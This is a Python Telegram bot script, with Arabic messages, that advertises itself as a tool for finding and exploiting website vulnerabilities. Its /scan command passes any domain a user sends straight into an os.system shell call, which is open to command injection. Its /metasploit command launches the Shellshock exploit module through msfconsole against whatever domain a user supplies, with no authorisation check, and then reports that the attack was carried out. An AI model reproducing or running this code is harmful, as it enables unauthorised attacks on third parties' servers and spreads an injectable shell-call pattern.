import os
from telegram.ext import Updater, CommandHandler
from dotenv import load_dotenv

# تحميل المتغيرات من ملف .env
load_dotenv()

# الحصول على التوكن من متغير البيئة
BOT_TOKEN = os.getenv("BOT_TOKEN")

def start(update, context):
    # رسالة الترحيب مع معلومات عن البوت
    update.message.reply_text(
        "مرحبًا! 👋\n\n"
        "🔧 **تم تطوير هذا البوت بواسطة:**\n"
        "ماجد المهندس، مؤسس شركة **باج باونتي** في اليمن، وهي الأولى في هذا المجال.\n\n"
        
        "🛠️ **الأداة تقوم بما يلي:**\n"
        "- اكتشاف الثغرات الأمنية في المواقع\n"
        "- استغلال الثغرات باستخدام أدوات مثل `nmap`, `subfinder`, `httpx`, `nuclei`، و `Metasploit`.\n\n"
        
        "🚀 **كيفية الاستخدام:**\n"
        "1. ارسل لي اسم النطاق الذي ترغب في فحصه باستخدام الأمر التالي:\n"
        "`/scan <domain_name>`\n"
        "2. سيقوم البوت بتنفيذ الفحص وإرسال النتائج فور الانتهاء.\n\n"
        
        "💡 إذا كنت بحاجة إلى مساعدة، يمكنك دائمًا استخدام الأمر `/help`.\n\n"
        
        "📞 **للتواصل مع المعد (ماجد المهندس) عبر تيلجرام:**\n"
        "- [@helx1](https://t.me/helx1)\n"
        "- [@helxsa](https://t.me/helxsa)\n"
        "- [@helxone](https://t.me/helxone)"
    )

def scan(update, context):
    domain = ' '.join(context.args)
    if not domain:
        update.message.reply_text("يرجى إرسال اسم النطاق بعد الأمر /scan")
        return

    # تنفيذ فحص باستخدام الأدوات التي تديرها في السكربت
    os.system(f"./scanner.sh {domain}")
    update.message.reply_text(f"تم الانتهاء من فحص النطاق: {domain}. تحقق من الملفات الناتجة.")

def metasploit(update, context):
    # استخدام Metasploit لتشغيل فحص أو استغلال
    domain = ' '.join(context.args)
    if not domain:
        update.message.reply_text("يرجى إرسال اسم النطاق بعد الأمر /metasploit")
        return

    # تكامل مع Metasploit باستخدام سكربت أو أوامر معينة
    os.system(f"msfconsole -x 'use exploit/unix/http/apache_mod_cgi_bash_env_exec; set RHOST {domain}; run'")
    update.message.reply_text(f"تم تنفيذ هجوم Metasploit على النطاق: {domain}. تحقق من النتائج.")

updater = Updater(BOT_TOKEN, use_context=True)
updater.dispatcher.add_handler(CommandHandler("start", start))
updater.dispatcher.add_handler(CommandHandler("scan", scan))
updater.dispatcher.add_handler(CommandHandler("metasploit", metasploit))

updater.start_polling()
updater.idle()
